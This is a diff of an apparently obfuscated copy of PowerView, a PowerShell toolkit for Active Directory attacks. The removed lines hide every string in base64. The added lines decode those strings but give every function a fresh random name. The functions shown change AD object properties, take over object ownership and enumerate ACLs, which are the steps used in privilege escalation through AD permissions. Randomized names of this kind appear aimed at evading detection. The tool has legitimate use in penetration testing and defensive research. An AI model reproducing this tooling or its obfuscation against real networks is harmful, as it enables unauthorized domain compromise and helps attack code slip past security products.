+                    Write-Warning ("[Set-DomainObject] Error setting/replacing properties for object '{0}' : {1}" -f $($RawObject.Properties.samaccountname), $_)
                 }
             }
-            if($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WE9S")))]) {
+            if($PSBoundParameters['XOR']) {
                 try {
-                    $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WE9S")))].GetEnumerator() | ForEach-Object {
+                    $PSBoundParameters['XOR'].GetEnumerator() | ForEach-Object {
                         $PropertyName = $_.Name
                         $PropertyXorValue = $_.Value
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIFhPUmluZyAnJFByb3BlcnR5TmFtZScgd2l0aCAnJFByb3BlcnR5WG9yVmFsdWUnIGZvciBvYmplY3QgJ3swfQ=="))) -f $($RawObject.Properties.samaccountname))
+                        Write-Verbose ("[Set-DomainObject] XORing '$PropertyName' with '$PropertyXorValue' for object '{0}'" -f $($RawObject.Properties.samaccountname))
                         $TypeName = $Entry.$PropertyName[0].GetType().name
 
                         
@@ -4369,20 +4373,20 @@ function sigkvf {
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIEVycm9yIFhPUidpbmcgcHJvcGVydGllcyBmb3Igb2JqZWN0ICd7MH0nIDogezF9"))) -f $($RawObject.Properties.samaccountname), $_)
+                    Write-Warning ("[Set-DomainObject] Error XOR'ing properties for object '{0}' : {1}" -f $($RawObject.Properties.samaccountname), $_)
                 }
             }
-            if($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xlYXI=")))]) {
+            if($PSBoundParameters['Clear']) {
                 try {
-                    $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2xlYXI=")))] | ForEach-Object {
+                    $PSBoundParameters['Clear'] | ForEach-Object {
                         $PropertyName = $_
-                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIENsZWFyaW5nICckUHJvcGVydHlOYW1lJyBmb3Igb2JqZWN0ICd7MH0="))) -f $($RawObject.Properties.samaccountname))
+                        Write-Verbose ("[Set-DomainObject] Clearing '$PropertyName' for object '{0}'" -f $($RawObject.Properties.samaccountname))
                         $Entry.$PropertyName.clear()
                     }
                     $Entry.commitchanges()
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RdIEVycm9yIGNsZWFyaW5nIHByb3BlcnRpZXMgZm9yIG9iamVjdCAnezB9JyA6IHsxfQ=="))) -f $($RawObject.Properties.samaccountname), $_)
+                    Write-Warning ("[Set-DomainObject] Error clearing properties for object '{0}' : {1}" -f $($RawObject.Properties.samaccountname), $_)
                 }
             }
         }
@@ -4390,7 +4394,7 @@ function sigkvf {
 }
 
 
-function bzhlww {
+function kalzwf {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
@@ -4406,10 +4410,10 @@ function bzhlww {
 
     Begin {
         if($LogonHoursArray.Count -ne 21) {
-            throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9nb25Ib3Vyc0FycmF5IGlzIHRoZSBpbmNvcnJlY3QgbGVuZ3Ro")))
+            throw "LogonHoursArray is the incorrect length"
         }
 
-        function pobdmf {
+        function qpiwok {
             Param (
                 [int[]]
                 $HoursArr
@@ -4419,7 +4423,7 @@ function bzhlww {
             for($i=0; $i -lt 3; $i++) {
                 $Byte = $HoursArr[$i]
                 $Offset = $i * 8
-                $Str = [Convert]::ToString($Byte,2).PadLeft(8,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))
+                $Str = [Convert]::ToString($Byte,2).PadLeft(8,'0')
 
                 $LogonHours[$Offset+0] = [bool] [convert]::ToInt32([string]$Str[7])
                 $LogonHours[$Offset+1] = [bool] [convert]::ToInt32([string]$Str[6])
@@ -4437,23 +4441,23 @@ function bzhlww {
 
     Process {
         $Output = @{
-            Sunday = pobdmf -HoursArr $LogonHoursArray[0..2]
-            Monday = pobdmf -HoursArr $LogonHoursArray[3..5]
-            Tuesday = pobdmf -HoursArr $LogonHoursArray[6..8]
-            Wednesday = pobdmf -HoursArr $LogonHoursArray[9..11]
-            Thurs = pobdmf -HoursArr $LogonHoursArray[12..14]
-            Friday = pobdmf -HoursArr $LogonHoursArray[15..17]
-            Saturday = pobdmf -HoursArr $LogonHoursArray[18..20]
+            Sunday = qpiwok -HoursArr $LogonHoursArray[0..2]
+            Monday = qpiwok -HoursArr $LogonHoursArray[3..5]
+            Tuesday = qpiwok -HoursArr $LogonHoursArray[6..8]
+            Wednesday = qpiwok -HoursArr $LogonHoursArray[9..11]
+            Thurs = qpiwok -HoursArr $LogonHoursArray[12..14]
+            Friday = qpiwok -HoursArr $LogonHoursArray[15..17]
+            Saturday = qpiwok -HoursArr $LogonHoursArray[18..20]
         }
 
         $Output = New-Object PSObject -Property $Output
-        $Output.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3LkxvZ29uSG91cnM="))))
+        $Output.PSObject.TypeNames.Insert(0, 'PowerView.LogonHours')
         $Output
     }
 }
 
 
-function kihuud {
+function xtfgki {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -4477,7 +4481,7 @@ function kihuud {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -4523,24 +4527,24 @@ function kihuud {
     )
 
     Begin {
-        if ($PrincipalIdentity -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {
+        if ($PrincipalIdentity -notmatch '^S-1-.*') {
             $PrincipalSearcherArguments = @{
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk="))) = $PrincipalIdentity
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
+                'Identity' = $PrincipalIdentity
+                'Properties' = 'distinguishedname,objectsid'
             }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsRG9tYWlu")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $PrincipalDomain }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $PrincipalSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-            $Principal = kzvwpf @PrincipalSearcherArguments
+            if ($PSBoundParameters['PrincipalDomain']) { $PrincipalSearcherArguments['Domain'] = $PrincipalDomain }
+            if ($PSBoundParameters['Server']) { $PrincipalSearcherArguments['Server'] = $Server }
+            if ($PSBoundParameters['SearchScope']) { $PrincipalSearcherArguments['SearchScope'] = $SearchScope }
+            if ($PSBoundParameters['ResultPageSize']) { $PrincipalSearcherArguments['ResultPageSize'] = $ResultPageSize }
+            if ($PSBoundParameters['ServerTimeLimit']) { $PrincipalSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+            if ($PSBoundParameters['Tombstone']) { $PrincipalSearcherArguments['Tombstone'] = $Tombstone }
+            if ($PSBoundParameters['Credential']) { $PrincipalSearcherArguments['Credential'] = $Credential }
+            $Principal = guawbd @PrincipalSearcherArguments
             if (-not $Principal) {
-                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VW5hYmxlIHRvIHJlc29sdmUgcHJpbmNpcGFsOiAkUHJpbmNpcGFsSWRlbnRpdHk=")))
+                throw "Unable to resolve principal: $PrincipalIdentity"
             }
             elseif($Principal.Count -gt 1) {
-                throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsSWRlbnRpdHkgbWF0Y2hlcyBtdWx0aXBsZSBBRCBvYmplY3RzLCBidXQgb25seSBvbmUgaXMgYWxsb3dlZA==")))
+                throw "PrincipalIdentity matches multiple AD objects, but only one is allowed"
             }
             $ObjectSid = $Principal.objectsid
         }
@@ -4558,7 +4562,7 @@ function kihuud {
     }
 
     Process {
-        if($PSCmdlet.ParameterSetName -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXVkaXRSdWxlVHlwZQ==")))) {
+        if($PSCmdlet.ParameterSetName -eq 'AuditRuleType') {
 
             if($ObjectType -eq $null -and $InheritanceType -eq [String]::Empty -and $InheritedObjectType -eq $null) {
                 New-Object System.DirectoryServices.ActiveDirectoryAuditRule -ArgumentList $Identity, $ADRight, $AuditFlag
@@ -4596,7 +4600,7 @@ function kihuud {
 }
 
 
-function mmdrjb {
+function xvkjju {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -4635,7 +4639,7 @@ function mmdrjb {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -4655,43 +4659,43 @@ function mmdrjb {
 
     BEGIN {
         $SearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
 
-        $OwnerSid = kzvwpf @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
+        $OwnerSid = guawbd @SearcherArguments -Identity $OwnerIdentity -Properties objectsid | Select-Object -ExpandProperty objectsid
         if ($OwnerSid) {
             $OwnerIdentityReference = [System.Security.Principal.SecurityIdentifier]$OwnerSid
         }
         else {
-            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RPd25lcl0gRXJyb3IgcGFyc2luZyBvd25lciBpZGVudGl0eSAnJE93bmVySWRlbnRpdHk=")))
+            Write-Warning "[Set-DomainObjectOwner] Error parsing owner identity '$OwnerIdentity'"
         }
     }
 
     PROCESS {
         if ($OwnerIdentityReference) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))] = $True
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $Identity
+            $SearcherArguments['Raw'] = $True
+            $SearcherArguments['Identity'] = $Identity
 
             
-            $RawObject = kzvwpf @SearcherArguments
+            $RawObject = guawbd @SearcherArguments
 
             ForEach ($Object in $RawObject) {
                 try {
-                    Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RPd25lcl0gQXR0ZW1wdGluZyB0byBzZXQgdGhlIG93bmVyIGZvciAnJElkZW50aXR5JyB0byAnJE93bmVySWRlbnRpdHk=")))
+                    Write-Verbose "[Set-DomainObjectOwner] Attempting to set the owner for '$Identity' to '$OwnerIdentity'"
                     $Entry = $RawObject.GetDirectoryEntry()
-                    $Entry.PsBase.Options.SecurityMasks = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXI=")))
+                    $Entry.PsBase.Options.SecurityMasks = 'Owner'
                     $Entry.PsBase.ObjectSecurity.SetOwner($OwnerIdentityReference)
                     $Entry.PsBase.CommitChanges()
                 }
                 catch {
-                    Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1NldC1Eb21haW5PYmplY3RPd25lcl0gRXJyb3Igc2V0dGluZyBvd25lcjogezB9"))) -f $_)
+                    Write-Warning ("[Set-DomainObjectOwner] Error setting owner: {0}" -f $_)
                 }
             }
         }
@@ -4699,7 +4703,7 @@ function mmdrjb {
 }
 
 
-function icohnm {
+function vwpfbo {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -4743,7 +4747,7 @@ function icohnm {
 
         [ValidateSet('Base', 'OneLevel', 'Subtree')]
         [String]
-        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),
+        $SearchScope = 'Subtree',
 
         [ValidateRange(1, 10000)]
         [Int]
@@ -4763,35 +4767,35 @@ function icohnm {
 
     BEGIN {
         $SearcherArguments = @{
-            'Properties' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWUsbnRzZWN1cml0eWRlc2NyaXB0b3IsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lk")))
+            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'
         }
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA==")))]) {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2FjbA==")))
+        if ($PSBoundParameters['Sacl']) {
+            $SearcherArguments['SecurityMasks'] = 'Sacl'
         }
         else {
-            $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA==")))
+            $SearcherArguments['SecurityMasks'] = 'Dacl'
         }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
-        $Searcher = ltdynu @SearcherArguments
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $Searcher = vydvzz @SearcherArguments
 
         $DomainGUIDMapArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DomainGUIDMapArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }
+        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZUdVSURz")))]) {
-            $GUIDs = tsvjlo @DomainGUIDMapArguments
+        if ($PSBoundParameters['ResolveGUIDs']) {
+            $GUIDs = ubzvol @DomainGUIDMapArguments
         }
     }
 
@@ -4800,48 +4804,48 @@ function icohnm {
             $IdentityFilter = ''
             $Filter = ''
             $Identity | Where-Object {$_} | ForEach-Object {
-                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
-                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS0uKg==")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdHNpZD0kSWRlbnRpdHlJbnN0YW5jZSk=")))
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-.*') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                 }
-                elseif ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihDTnxPVXxEQyk9Lio=")))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
-                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
+                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                         
                         
-                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIEV4dHJhY3RlZCBkb21haW4gJyRJZGVudGl0eURvbWFpbicgZnJvbSAnJElkZW50aXR5SW5zdGFuY2U=")))
-                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
-                        $Searcher = ltdynu @SearcherArguments
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $Searcher = vydvzz @SearcherArguments
                         if (-not $Searcher) {
-                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PYmplY3RBY2xdIFVuYWJsZSB0byByZXRyaWV2ZSBkb21haW4gc2VhcmNoZXIgZm9yICckSWRlbnRpdHlEb21haW4=")))
+                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                         }
                     }
                 }
-                elseif ($IdentityInstance -imatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlswLTlBLUZdezh9LShbMC05QS1GXXs0fS0pezN9WzAtOUEtRl17MTJ9JA==")))) {
-                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))) + $_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WDI=")))) }) -join ''
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
                 }
-                elseif ($IdentityInstance.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg=="))))) {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRuc2hvc3RuYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
+                elseif ($IdentityInstance.Contains('.')) {
+                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                 }
                 else {
-                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwoc2FtQWNjb3VudE5hbWU9JElkZW50aXR5SW5zdGFuY2UpKG5hbWU9JElkZW50aXR5SW5zdGFuY2UpKGRpc3BsYXluYW1lPSRJZGVudGl0eUluc3RhbmNlKSk=")))
